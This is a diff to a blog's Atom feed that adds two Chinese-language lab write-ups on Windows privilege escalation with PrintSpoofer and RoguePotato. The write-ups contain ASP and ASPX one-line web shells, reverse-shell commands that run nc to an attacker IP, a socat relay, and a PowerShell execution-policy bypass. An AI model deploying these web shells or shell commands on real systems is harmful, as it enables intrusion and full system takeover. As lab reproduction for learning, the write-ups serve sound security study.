@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://perthinking.xyz/"/>
-  <updated>2020-05-13T08:23:33.573Z</updated>
+  <updated>2020-05-14T11:39:12.605Z</updated>
   <id>http://perthinking.xyz/</id>
   
   <author>
@@ -15,6 +15,61 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Windows-PrintSpoofer提权</title>
+    <link href="http://perthinking.xyz/Elevation/2/"/>
+    <id>http://perthinking.xyz/Elevation/2/</id>
+    <published>2020-05-14T11:12:23.000Z</published>
+    <updated>2020-05-14T11:39:12.605Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.搭建一个iis服务器 写上一句话</p><p> &lt;%eval request(“a”)%&gt;</p><p> 蚁剑连接</p><p><img src="/Elevation/2/1.png" alt></p><p>提权前提  需要有SeImpersonatePrivileg这个权限</p><p><img src="/Elevation/2/2.png" alt></p><p>然后编译exp  编译完成后中上传到靶机中 并执行 可能出现以下问题</p><p> vcruntime140d.dll丢失</p><p> 然后修改为选项就可以了</p><p><img src="/Elevation/2/3.png" alt></p><p>经过多次编译 发现目标机无法执行成功exp</p><p><img src="/Elevation/2/4.png" alt></p><p><img src="/Elevation/2/5.png" alt></p><p>发现版本有限制…</p><p> From LOCAL/NETWORK SERVICE to SYSTEM by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019</p><p> 放在win10上就成功了</p><p>aspx一句话:&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“a”],”unsafe”);%&gt;</p><p><img src="/Elevation/2/6.png" alt></p><p>拓展下 反弹shell</p><p>PrintSpoofer.exe -c “C:\inetpub\wwwroot\nc.exe 192.168.0.104 8888 -e cmd”</p><p><img src="/Elevation/2/7.png" alt></p><p>生成系统进程 Spawn a SYSTEM process on a desktop</p><p> PrintSpoofer.exe -d 3 -c “powershell -ep bypass”</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;1.搭建一个iis服务器 写上一句话&lt;/p&gt;
+&lt;p&gt; &amp;lt;%eval request(“a”)%&amp;gt;&lt;/p&gt;
+&lt;p&gt; 蚁剑连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/Elevation/2/1.png&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;提权前提  需要有SeImpersona
+      
+    
+    </summary>
+    
+    
+      <category term="Elevation" scheme="http://perthinking.xyz/categories/Elevation/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Windows-RoguePotato  提权</title>
+    <link href="http://perthinking.xyz/Elevation/1/"/>
+    <id>http://perthinking.xyz/Elevation/1/</id>
+    <published>2020-05-14T10:52:07.000Z</published>
+    <updated>2020-05-14T11:39:27.990Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>复现下国外大佬的提权</p></blockquote><h1 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h1><p><a href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/amp/?__twitter_impression=true&amp;tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/amp/?__twitter_impression=true&amp;tdsourcetag=s_pctim_aiomsg</a></p><p> 项目源码:<a href="https://github.com/antonioCoco/RoguePotato" target="_blank" rel="noopener">https://github.com/antonioCoco/RoguePotato</a></p><h1 id="2-复现"><a href="#2-复现" class="headerlink" title="2.复现"></a>2.复现</h1><p>靶机: win10  ip:192.168.0.102</p><p>攻击机: kali ip:192.168.0.101</p><p>首先 下载源码后编译 注意是 release 编译</p><p><img src="/Elevation/1/1.png" alt></p><p>编译后如下:</p><p><img src="/Elevation/1/2.png" alt></p><p>然后将编译后的软件上传到靶机中 我是将整个文件夹上传上去</p><p> 看用法说明 应该要用到  RogueOxidResolver.exe</p><p><img src="/Elevation/1/3.png" alt></p><p>在win10开启一个iis 并上传一个执行命令的小马 在github上可以下载</p><p><img src="/Elevation/1/4.png" alt></p><p><img src="/Elevation/1/5.png" alt></p><p>访问后执行命令确保小马有用</p><p><img src="/Elevation/1/6.png" alt></p><p>然后在靶机上上传nc 并开启RPC服务  默认是开启的</p><p>在攻击机上执行命令:</p><p>socat tcp-listen:135,reuseaddr,fork tcp:192.168.0.102:9999</p><p>Nc -lvp 4444</p><p>网站shell中执行</p><p>.\RoguePotato.exe -r 192.168.0.101 -e “E:\Debug\nc64.exe 192.168.0.101 4444 -e cmd.exe” -l 9999</p><p>成功反弹shell 并获得系统权限 成功提权</p><p><img src="/Elevation/1/7.png" alt></p><p><img src="/Elevation/1/8.png" alt></p><p>然后也可以看到4444端口连接</p><p><img src="/Elevation/1/9.png" alt></p><p>还要说明的就是用户权限不能反弹shell</p><p><img src="/Elevation/1/10.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;p&gt;复现下国外大佬的提权&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&quot;1-原理&quot;&gt;&lt;a href=&quot;#1-原理&quot; class=&quot;headerlink&quot; title=&quot;1.原理&quot;&gt;&lt;/a&gt;1.原理&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://
+      
+    
+    </summary>
+    
+    
+      <category term="Elevation" scheme="http://perthinking.xyz/categories/Elevation/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>Soapclient+crlf+ssrf(原理)</title>
